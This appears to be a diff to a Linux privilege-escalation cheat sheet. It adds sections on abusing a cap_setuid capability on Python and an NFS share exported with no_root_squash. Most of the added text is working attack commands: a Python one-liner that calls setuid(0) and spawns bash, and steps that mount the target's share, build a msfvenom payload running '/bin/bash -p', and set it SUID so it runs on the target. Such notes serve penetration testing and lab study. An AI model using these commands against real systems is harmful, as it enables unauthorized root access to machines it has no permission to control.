@@ -5,6 +5,8 @@
  * [sudo](#sudo)
  * [Suid](#Suid)
  * [Crontab](#crontab)
+ * [Capabilities](#Capabilities)
+ * [NFS Root Squashing](#NFS-Root-Squashing)
 
 
 
@@ -414,7 +416,65 @@ Change File permissions And Exploit
      
 
 
+ ## Capabilities 
+ 
+ 
+ Type Command
+ 
+    getcap -r / 2>/dev/null
+ 
+Output
+ 
+    /usr/bin/python2.6 = cap_setuid+ep
+   
+   
+Exploit
+ 
+    /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+   
 
+
+
+
+
+   
+   
+## NFS Root Squashing
+   
+   
+ Type Command
+ 
+     cat /etc/exports
+     
+ OUTPUT 
+ 
+     /etc/exports: the access control list for filesystems which may be exported
+     #		to NFS clients.  See exports(5).
+     #
+     # Example for NFSv2 and NFSv3:
+     # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+     #
+     # Example for NFSv4:
+     # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+     # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+     #
+
+     /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+     #/tmp *(rw,sync,insecure,no_subtree_check)
+
+
+  ### Exploit
+  
+  Open Your LOCAL MACHINE AND TYPE COMMAND
+  
+    mkdir /tmp/asif
+    mount -o rw,vers=2 <Target IP>:/tmp /tmp/asif
+    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/asif/shell.elf
+    chmod +xs /tmp/asif/shell.elf
+  Type A Remote Machine
+  
+    /tmp/shell.elf
 
 
 
